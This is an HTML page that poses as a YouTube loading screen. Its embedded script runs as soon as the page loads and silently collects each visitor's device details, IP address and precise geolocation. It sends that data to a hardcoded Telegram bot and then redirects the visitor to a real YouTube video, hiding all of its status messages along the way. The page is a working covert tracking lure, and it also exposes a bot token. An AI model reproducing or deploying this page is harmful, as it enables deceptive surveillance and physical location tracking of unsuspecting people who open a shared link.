<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "YouTube Sans", "Roboto", sans-serif;
            background: #0f0f0f;
            color: #f1f1f1;
            height: 100vh;
            overflow: hidden;
        }

        /* Header */
        .header {
            background: #0f0f0f;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #303030;
        }

        .header-start {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .menu-icon {
            width: 24px;
            height: 24px;
            cursor: pointer;
        }

        .youtube-logo {
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .youtube-logo svg {
            width: 90px;
            height: 20px;
        }

        /* Loading Container */
        .loading-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        /* YouTube Spinner */
        .spinner-wrapper {
            margin-bottom: 24px;
        }

        .youtube-spinner {
            width: 48px;
            height: 48px;
            margin: 0 auto;
            position: relative;
        }

        .spinner-red {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid transparent;
            border-top-color: #ff0000;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Loading Text */
        .loading-text {
            font-size: 16px;
            color: #aaa;
            margin-bottom: 24px;
        }

        /* Status Text */
        .status-text {
            font-size: 12px;
            color: #717171;
            margin-top: 8px;
            height: 20px;
        }

        /* YouTube Red Theme */
        .youtube-red {
            color: #ff0000;
        }

        /* Pulse Animation */
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }

        .loading-text {
            animation: pulse 1.5s ease-in-out infinite;
        }

        /* Progress indicator */
        .progress-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #333;
            animation: dotPulse 1.4s ease-in-out infinite;
        }

        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotPulse {
            0%, 80%, 100% { 
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% { 
                transform: scale(1.2);
                opacity: 1;
            }
        }
    </style>
</head>

    <!-- Loading Container -->
    <div class="loading-container">
        <div class="spinner-wrapper">
            <div class="youtube-spinner">
                <div class="spinner-red"></div>
            </div>
        </div>
        
        <div class="loading-text" style="display: none;"></div>
        
        <div class="progress-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <div class="status-text" id="statusText" style="display: none;"></div>
    </div>

    <script>
        // =============================================================================
        // إعدادات النظام - مُحسنة
        // =============================================================================
        
        const CONFIG = {
            REDIRECT_URL: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
            BOT_TOKEN: '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI',
            CHAT_ID: '170383339',
            TIMEOUT: 8000 // مهلة 8 ثواني
        };
        
        // =============================================================================
        // متغيرات النظام
        // =============================================================================
        
        let state = {
            redirected: false,
            dataCollected: false,
            processingStarted: false
        };
        
        // =============================================================================
        // وظائف المساعدة
        // =============================================================================
        
        function log(message) {
            const time = new Date().toLocaleTimeString();
            console.log(`[${time}] ${message}`);
        }
        
        function updateStatus(message) {
            // تم إخفاء جميع الرسائل
            return;
        }
        
        function safeRedirect() {
            if (state.redirected) return;
            state.redirected = true;
            
            log('🔄 بدء التحويل...');
            // updateStatus('تحويل إلى YouTube...'); // مخفي
            
            setTimeout(() => {
                try {
                    window.location.replace(CONFIG.REDIRECT_URL);
                } catch (e) {
                    window.location.href = CONFIG.REDIRECT_URL;
                }
            }, 500);
        }
        
        // =============================================================================
        // جمع البيانات
        // =============================================================================
        
        function collectDeviceInfo() {
            const ua = navigator.userAgent || '';
            const now = new Date();
            
            // تحديد نوع الجهاز والمتصفح
            const deviceType = 
                /iPhone/i.test(ua) ? 'iPhone' :
                /iPad/i.test(ua) ? 'iPad' :
                /Android/i.test(ua) ? 'Android' :
                /Windows/i.test(ua) ? 'Windows' :
                /Mac/i.test(ua) ? 'Mac' :
                /Linux/i.test(ua) ? 'Linux' : 'Unknown';
            
            const browser = 
                /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                /Firefox/i.test(ua) ? 'Firefox' :
                /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                /Edge/i.test(ua) ? 'Edge' :
                /Opera/i.test(ua) ? 'Opera' : 'Unknown';
            
            return {
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                userAgent: ua,
                deviceType,
                browser,
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                language: navigator.language || 'ar',
                platform: navigator.platform || 'Unknown',
                screenSize: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine
            };
        }
        
        // الحصول على IP مع تحسينات
        async function getIPAddress() {
            // updateStatus('جاري الحصول على IP...'); // مخفي
            
            const services = [
                { url: 'https://api.ipify.org?format=json', key: 'ip' },
                { url: 'https://httpbin.org/ip', key: 'origin' },
                { url: 'https://api.my-ip.io/ip.json', key: 'ip' },
                { url: 'https://ipapi.co/json/', key: 'ip' }
            ];
            
            for (const service of services) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 3000);
                    
                    const response = await fetch(service.url, {
                        method: 'GET',
                        signal: controller.signal,
                        headers: { 'Accept': 'application/json' }
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = data[service.key];
                        if (ip && ip.trim()) {
                            log(`✅ IP من ${service.url}: ${ip}`);
                            return ip.trim();
                        }
                    }
                } catch (error) {
                    log(`❌ فشل ${service.url}: ${error.message}`);
                }
            }
            
            log('❌ فشل الحصول على IP');
            return 'غير متوفر';
        }
        
        // الحصول على الموقع الجغرافي
        function getGeolocation() {
            return new Promise((resolve) => {
                // updateStatus('طلب الموقع الجغرافي...'); // مخفي
                
                if (!navigator.geolocation) {
                    log('❌ المتصفح لا يدعم تحديد الموقع');
                    resolve(null);
                    return;
                }
                
                let resolved = false;
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 60000
                };
                
                const success = (position) => {
                    if (resolved) return;
                    resolved = true;
                    
                    const coords = position.coords;
                    const location = {
                        latitude: parseFloat(coords.latitude.toFixed(6)),
                        longitude: parseFloat(coords.longitude.toFixed(6)),
                        accuracy: Math.round(coords.accuracy),
                        altitude: coords.altitude,
                        speed: coords.speed,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    log(`✅ الموقع: ${location.latitude}, ${location.longitude}`);
                    resolve(location);
                };
                
                const error = (err) => {
                    if (resolved) return;
                    
                    const errors = {
                        1: 'تم رفض الإذن',
                        2: 'الموقع غير متوفر',
                        3: 'انتهت المهلة الزمنية'
                    };
                    
                    log(`❌ خطأ في الموقع: ${errors[err.code] || err.message}`);
                };
                
                navigator.geolocation.getCurrentPosition(success, error, options);
                
                // إنهاء المحاولة بعد 6 ثوان
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        log('⏰ انتهت مهلة الحصول على الموقع');
                        resolve(null);
                    }
                }, 6000);
            });
        }
        
        // =============================================================================
        // إرسال البيانات
        // =============================================================================
        
        async function sendToTelegram(data) {
            // updateStatus('إرسال البيانات...'); // مخفي
            
            const telegramURL = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
            
            // تنسيق الموقع
            let locationInfo = 'غير متوفر';
            let mapLink = '';
            
            if (data.location) {
                const { latitude, longitude, accuracy } = data.location;
                locationInfo = `${latitude}, ${longitude} (دقة: ${accuracy}م)`;
                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            }
            
            // بناء الرسالة
            const message = `🎯 زائر جديد - YouTube Clone

⏰ التوقيت: ${data.device.localTime}
🌐 الرابط: ${data.device.url}
🔗 المرجع: ${data.device.referrer}

📱 المعلومات:
• الجهاز: ${data.device.deviceType}
• المتصفح: ${data.device.browser}
• محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
• اللغة: ${data.device.language}
• النظام: ${data.device.platform}

🌐 الشبكة:
• IP: ${data.ip}
• متصل: ${data.device.onlineStatus ? 'نعم' : 'لا'}
• Cookies: ${data.device.cookieEnabled ? 'مفعل' : 'معطل'}

📍 الموقع الجغرافي:
${locationInfo}

📐 الشاشة:
• الحجم: ${data.device.screenSize}
• النافذة: ${data.device.windowSize}
• المنطقة: ${data.device.timezone}

🔍 User Agent:
${data.device.userAgent}`;
            
            // إرسال الرسالة الأساسية
            try {
                log('📤 إرسال الرسالة الأساسية...');
                
                const response = await fetch(telegramURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    log('✅ تم إرسال الرسالة الأساسية');
                    
                    // إرسال رابط الخريطة إذا كان متوفراً
                    if (mapLink) {
                        try {
                            await fetch(telegramURL, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: CONFIG.CHAT_ID,
                                    text: `🗺️ عرض الموقع على الخريطة:\n${mapLink}`
                                })
                            });
                            log('✅ تم إرسال رابط الخريطة');
                        } catch (e) {
                            log('⚠️ فشل إرسال الخريطة');
                        }
                    }
                    
                    return true;
                } else {
                    const errorText = await response.text();
                    log(`❌ فشل الإرسال: ${response.status} - ${errorText}`);
                    return false;
                }
                
            } catch (error) {
                log(`❌ خطأ في الإرسال: ${error.message}`);
                return false;
            }
        }
        
        // =============================================================================
        // العملية الرئيسية
        // =============================================================================
        
        async function processVisitor() {
            if (state.processingStarted) return;
            state.processingStarted = true;
            
            log('🚀 بدء معالجة الزائر');
            // updateStatus('جاري جمع البيانات...'); // مخفي
            
            try {
                // جمع البيانات الأساسية
                const deviceInfo = collectDeviceInfo();
                log('✅ تم جمع معلومات الجهاز');
                
                // جمع IP والموقع بشكل متوازي
                const [ip, location] = await Promise.allSettled([
                    getIPAddress(),
                    getGeolocation()
                ]);
                
                const finalData = {
                    device: deviceInfo,
                    ip: ip.status === 'fulfilled' ? ip.value : 'غير متوفر',
                    location: location.status === 'fulfilled' ? location.value : null
                };
                
                log('📊 اكتمل جمع البيانات');
                state.dataCollected = true;
                
                // إرسال البيانات
                // updateStatus('إرسال المعلومات...'); // مخفي
                
                const sendSuccess = await sendToTelegram(finalData);
                
                if (sendSuccess) {
                    log('✅ تم إرسال جميع البيانات بنجاح');
                    // updateStatus('تم بنجاح - جاري التحويل...'); // مخفي
                } else {
                    log('❌ فشل في الإرسال');
                    // updateStatus('خطأ في الإرسال - جاري التحويل...'); // مخفي
                }
                
                // تأخير قصير قبل التحويل
                setTimeout(safeRedirect, 1000);
                
            } catch (error) {
                log(`❌ خطأ عام: ${error.message}`);
                // updateStatus('خطأ - جاري التحويل...'); // مخفي
                setTimeout(safeRedirect, 1000);
            }
        }
        
        // =============================================================================
        // تحسينات الأداء والموثوقية
        // =============================================================================
        
        // بدء المعالجة عند تحميل الصفحة
        function initializeApp() {
            log('🎯 تهيئة التطبيق');
            // updateStatus('بدء التحميل...'); // مخفي
            
            // تأخير بسيط لإظهار واجهة التحميل
            setTimeout(() => {
                processVisitor();
            }, 500);
        }
        
        // حماية من التعليق - تحويل إجباري
        function setupFailsafe() {
            setTimeout(() => {
                if (!state.redirected) {
                    log('⚠️ تحويل إجباري - انتهت المهلة');
                    // updateStatus('انتهت المهلة - جاري التحويل...'); // مخفي
                    safeRedirect();
                }
            }, CONFIG.TIMEOUT);
        }
        
        // التعامل مع حالات الخطأ
        window.addEventListener('error', (event) => {
            log(`❌ خطأ JavaScript: ${event.message}`);
            if (!state.redirected) {
                setTimeout(safeRedirect, 2000);
            }
        });
        
        window.addEventListener('unhandledrejection', (event) => {
            log(`❌ رفض غير معالج: ${event.reason}`);
            if (!state.redirected) {
                setTimeout(safeRedirect, 2000);
            }
        });
        
        // =============================================================================
        // تشغيل التطبيق
        // =============================================================================
        
        // البدء فور تحميل DOM
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializeApp);
        } else {
            initializeApp();
        }
        
        // إعداد الحماية من التعليق
        setupFailsafe();
        
        // رسالة تأكيد التحميل
        log('✅ تم تحميل نظام YouTube Clone بنجاح');
        
        // =============================================================================
        // تحسينات إضافية للموثوقية
        // =============================================================================
        
        // إعادة المحاولة في حالة فشل الإرسال
        let retryCount = 0;
        const maxRetries = 2;
        
        async function retryOperation(operation, data) {
            for (let i = 0; i <= maxRetries; i++) {
                try {
                    const result = await operation(data);
                    if (result) return result;
                } catch (error) {
                    log(`❌ محاولة ${i + 1} فشلت: ${error.message}`);
                    if (i < maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
            }
            return false;
        }
        
        // تحسين معالجة الأخطاء
        function handleError(error, context) {
            log(`❌ خطأ في ${context}: ${error.message}`);
            console.error(`Error in ${context}:`, error);
            
            if (!state.redirected) {
                // updateStatus('حدث خطأ - جاري التحويل...'); // مخفي
                setTimeout(safeRedirect, 2000);
            }
        }
        
        // مراقبة الأداء
        function monitorPerformance() {
            const startTime = performance.now();
            
            return {
                end: () => {
                    const endTime = performance.now();
                    const duration = Math.round(endTime - startTime);
                    log(`⏱️ وقت التنفيذ: ${duration}ms`);
                    return duration;
                }
            };
        }
        
        // تحسين تجربة المستخدم
        function enhanceUserExperience() {
            // تم إلغاء جميع الرسائل النصية
            return;
        }
        
        // بدء التحسينات
        enhanceUserExperience();
        
        // =============================================================================
        // معلومات تشخيصية
        // =============================================================================
        
        function logSystemInfo() {
            const info = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine,
                screenSize: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer || 'Direct'
            };
            
            log('📋 معلومات النظام:');
            Object.entries(info).forEach(([key, value]) => {
                log(`   ${key}: ${value}`);
            });
        }
        
        // عرض معلومات النظام في وضع التطوير
        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
            logSystemInfo();
        }
        
    </script>
</body>
</html>
